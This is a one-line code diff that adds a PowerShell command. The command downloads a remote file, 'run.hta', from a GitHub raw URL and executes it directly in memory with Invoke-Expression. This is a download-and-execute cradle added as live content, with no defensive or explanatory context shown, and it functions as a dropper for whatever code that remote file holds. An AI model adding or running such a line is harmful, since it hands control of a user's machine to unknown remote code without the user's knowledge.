@@ -1,0 +1,1 @@
+powershell -c "IEX ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/p477d343/T5CAMP/main/run.hta'))"
